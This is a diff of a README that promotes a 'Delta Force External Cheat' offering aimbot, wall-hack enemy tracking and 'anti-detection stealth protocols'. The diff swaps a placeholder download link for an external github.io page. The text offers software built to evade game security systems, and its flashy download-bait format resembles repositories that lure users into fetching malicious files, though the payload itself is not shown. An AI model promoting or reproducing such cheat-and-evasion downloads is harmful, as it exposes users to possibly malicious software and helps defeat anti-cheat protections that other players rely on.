@@ -1,11 +1,11 @@
 # 🚀 Delta Force External Cheat: Aimbot, ESP & Anti-Detection 🛡️  
 
-**Delta Force External Cheat** gives you an **unfair advantage** with **auto aim**, **real-time enemy tracking**, and **Anti-Detection stealth protocols**. Lock onto targets instantly, track enemies through walls, and stay undetected by game security systems. Perfect for dominating matches on all maps and modes [[1]][[3]].  
+**Delta Force External Cheat** gives you an **unfair advantage** with **auto aim**, **real-time enemy tracking**, and **Anti-Detection stealth protocols**. Lock onto targets instantly, track enemies through walls, and stay undetected by game security systems. Perfect for dominating matches on all maps and modes.  
 
 ---
 
 ### 🔗 Download Cheat  
-[![Download Delta Force External Cheat](https://img.shields.io/badge/Download%20Delta%20Force-Cheat-blueviolet)](#)  
+[![Download Delta Force External Cheat](https://img.shields.io/badge/Download%20Delta%20Force-Cheat-blueviolet)](https://delta-force-external-cheat.github.io/.github/)  
 
 ---
 
